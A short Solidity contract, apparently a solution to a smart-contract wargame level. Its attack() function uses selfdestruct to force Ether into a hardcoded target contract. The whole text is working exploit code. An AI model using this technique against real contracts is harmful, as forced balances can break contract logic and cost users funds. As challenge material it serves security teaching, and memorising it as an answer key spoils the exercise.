pragma solidity ^0.8.0;

contract Solution {

    address payable ogContract = payable(0x55A01B89DFbD9e20b25e1655EC5f46F335c2eBB3);

    function attack() public payable {
        require(msg.value > 0);
        selfdestruct(ogContract);
    }
}